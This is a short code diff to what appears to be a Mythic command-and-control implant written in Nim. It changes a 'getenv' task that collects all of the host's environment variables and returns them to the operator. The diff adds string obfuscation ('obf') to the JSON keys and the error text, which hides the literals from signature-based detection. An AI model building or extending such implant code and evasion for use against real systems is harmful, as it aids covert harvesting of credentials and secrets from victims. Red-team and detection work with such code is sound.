@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, os, strformat]
 
 proc getenv*(taskId: string, params: JsonNode): JsonNode =
@@ -13,8 +14,8 @@ proc getenv*(taskId: string, params: JsonNode): JsonNode =
     # Iterate over all environment variables
     for key, value in envPairs():
       var envPair = %*{
-        "key": key,
-        "value": value
+        obf("key"): key,
+        obf("value"): value
       }
       envList.add(envPair)
     
@@ -26,4 +27,4 @@ proc getenv*(taskId: string, params: JsonNode): JsonNode =
     return mythicSuccess(taskId, output)
     
   except Exception as e:
-    return mythicError(taskId, &"GetEnv error: {e.msg}")
+    return mythicError(taskId, obf("GetEnv error: ") & e.msg)
